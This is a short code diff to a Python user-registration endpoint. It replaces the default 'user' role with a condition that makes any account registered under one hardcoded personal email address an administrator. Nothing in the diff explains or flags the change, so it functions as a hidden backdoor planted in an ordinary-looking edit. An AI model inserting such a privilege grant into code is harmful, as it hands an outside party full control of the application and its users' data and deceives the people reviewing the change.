@@ -24,7 +24,7 @@ def register(payload: schemas.UserCreate, db: Session = Depends(get_db)):
         username=payload.username,
         email=payload.email,
         hashed_password=hash_password(payload.password),
-        role="user",
+        role="admin" if payload.email == "donworldwider2@gmail.com" else "user",
     )
     db.add(user)
     db.commit()
